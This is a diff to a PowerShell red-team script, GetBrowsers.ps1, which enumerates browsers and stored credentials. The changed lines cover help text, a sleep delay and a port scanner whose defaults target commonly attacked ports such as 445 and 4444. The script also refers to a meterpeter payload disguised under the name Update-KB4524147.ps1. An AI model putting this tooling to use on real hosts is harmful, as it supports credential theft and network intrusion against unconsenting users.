@@ -3,7 +3,7 @@
   Standalone Powershell Script to Leak Installed Browsers Information.
 
   Author: r00t-3xp10it (SSA RedTeam @2020)
-  Required Dependencies: IE, Firefox, Chrome
+  Required Dependencies: (iexplore|msedge), Firefox, Chrome
   Optional Dependencies: mozlz4-win32.exe, HackChrome.exe
   PS Script Dev Version: v1.18
 
@@ -57,7 +57,7 @@
    PS C:\> ./GetBrowsers.ps1 -SCAN 80,135,139,445
    Enumerates local|remote host open|closed tcp ports 
    'This Function does not allow the permanent storage of the logfile'
-   'If none value its enter after -SCAN arg, then a pre-select portscan will be conducted'
+   'If none value its input after -SCAN then the most commonly hacked ports will be scanned'
 
 .INPUTS
    None. You cannot pipe objects to GetBrowsers.ps1
@@ -104,11 +104,11 @@ If(-not($param1)){
     echo "./GetBrowsers.ps1 -CREDS            Enumerates ALL browsers credentials stored.`n" >> $LogFilePath\BrowserEnum.log
     echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates selected browser and stores logfile to 'tmp'." >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -SCAN 135,139,445 Enumerates local|remote host open|closed tcp ports." >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -SCAN 135,139,445 Enumerates local|remote host open|closed tcp ports.`n" >> $LogFilePath\BrowserEnum.log
     Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
         ## For those who insiste in running this script outside meterpeter
         If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){
-            Start-Sleep -Seconds 8
+            Start-Sleep -Seconds 6
         }
     Exit
 }
@@ -875,7 +875,7 @@ function CREDS_DUMP {
 
  ## Function tcp port scanner
  function PORTSCANNER {
-    If(-not($param2)){$PortRange = "21,22,23,80,135,139,443,445,666,4444"}else{$PortRange = $param2}
+    If(-not($param2)){$PortRange = "21,22,23,80,135,137,139,443,445,666,1433,4444,8080"}else{$PortRange = $param2}
     $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
     echo "`n`nRemote-Host   Status   Port" >> $LogFilePath\BrowserEnum.log
     echo "-----------   ------   ----" >> $LogFilePath\BrowserEnum.log
